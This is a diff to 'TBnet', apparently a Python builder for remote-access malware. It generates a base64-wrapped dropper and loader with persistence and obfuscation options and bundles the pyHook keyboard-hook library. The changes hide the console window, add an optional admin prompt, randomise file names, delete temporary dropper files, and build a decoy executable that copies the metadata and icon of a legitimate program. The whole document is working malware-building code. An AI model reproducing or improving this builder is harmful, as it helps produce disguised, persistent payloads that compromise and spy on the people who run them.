@@ -5,6 +5,12 @@ import shutil
 import base64
 import zlib
 import marshal
+import sys
+from getpass import getpass
+from pathlib import Path
+from hashlib import sha256
+import random
+import string
 
 image = """ _______  ______                __
 |_     _||   __ \.-----..-----.|  |_
@@ -12,6 +18,12 @@ image = """ _______  ______                __
   |___|  |______/|__|__||_____||____|
 """
 print(image)
+
+def getString(length):
+    """Générer une chaîne aléatoire de longueur fixe"""
+    str = string.ascii_lowercase
+    return ''.join(random.choice(str) for i in range(length))
+
 parser = argparse.ArgumentParser(description='TBnet Help Menu')
 parser.add_argument('--host', 
                     type=str, 
@@ -28,7 +40,7 @@ parser.add_argument('--name',
                     type=str, 
                     required=False, 
                     dest='name', 
-                    default="tbnet",
+                    default=getString(5),
                     help='Définir nom du fichier')
 parser.add_argument('--persistance',
                     type=bool,
@@ -62,6 +74,13 @@ parser.add_argument('--icon',
                     dest='icon',
                     default='',
                     help='Ajoute une icon à l\'éxecutable')
+parser.add_argument('--admin',
+                    action='store_const',
+                    const=True,
+                    required=False,
+                    dest='adm',
+                    default=False,
+                    help='Demande une autorisation Administrateur au lancement du programme')
 
 args = parser.parse_args()
 
@@ -70,10 +89,9 @@ class GenClient:
     pathDirFichier = "./code/"
     pathDirOutput = "./output/"
     pathDirHttp = "./http/"
-    pathPyInstaller = "C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe"
-    upx_dir = "C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64"
+    appdata = os.path.expandvars("%AppData%").replace("\Roaming","")
 
-    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe):
+    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe, adm):
         fin_dropeur = """)))))
     except Exception as e:
         print(str(e))
@@ -110,16 +128,19 @@ class GenClient:
         drop_txt = str(base64.b64encode(open(self.pathDirOutput + "drop_" + name + ".pyw", "r").read().encode('utf-8')))[1:]
         fichier.write(debut_loader + drop_txt + fin_loader)
         fichier.close()
+        if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
+            os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
         # si l'options freeze est choisi
         if path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
             if freeze: ### --onefile
                 ## Complier le loader
-                if icon == "":
-                    cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
-                    os.system(cmd)
-                else:
-                    cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
-                    os.system(cmd)
+                cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
+                if adm:
+                    cmd = cmd + " --windows-uac-admin"
+                #if not icon == "":
+                    #cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
+                cmd = cmd + " {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+                os.system(cmd)
                 print("Compilation terminer")
                 print("Nettoyage des fichier temporaire")
                 # netoyyer fichier temporaire
@@ -139,7 +160,7 @@ class GenClient:
                 print("Client prêt : output/" + "load_" + name + ".pyw")
         else:
             ## Complier le loader
-            cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+            cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
             os.system(cmd)
             shutil.copyfile("load_" + name + ".exe", self.pathDirHttp + name + ".exe")
             if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
@@ -189,7 +210,7 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             ## Compiler le faux programmes
             fileVersionNumber, companyName, fileDescription = self.ExtractInfo(path_exe)
             ##--windows-company-name=  --windows-file-version=  --windows-file-description=
-            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
+            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --windows-disable-console --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
             os.system(cmd)
             shutil.copyfile(name_exe_no_ext + ".exe", self.pathDirOutput + name_exe_no_ext + ".exe")
             if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
@@ -206,8 +227,6 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             Company Name
             FileDescription
             """
-            
-
 
     def ReturnFichier(self, nom_fichier):
         fichier = open(self.pathDirFichier + nom_fichier, "r")
@@ -219,7 +238,7 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
         
         import exiftool
 
-        with exiftool.ExifTool("C:/Users/theoc/AppData/Local/Programs/Python/Python37/exiftool(-k).exe") as et:
+        with exiftool.ExifTool(self.appdata + "\\Local\\Programs\\Python\\Python37\\exiftool(-k).exe") as et:
             print("Lancement de ExifTool")
             metadata = et.get_metadata(file)
             fileVersionNumber = metadata["EXE:FileVersionNumber"]
@@ -227,8 +246,8 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             fileDescription = metadata["EXE:FileDescription"]
             print("{} {} {}".format(fileVersionNumber, companyName, fileDescription))
             return fileVersionNumber, companyName, fileDescription
-        
-        
 
-GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe)
+if args.freeze == False and args.path_exe == "" and args.adm == True:
+    os._exit(0)
 
+GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe, args.adm)
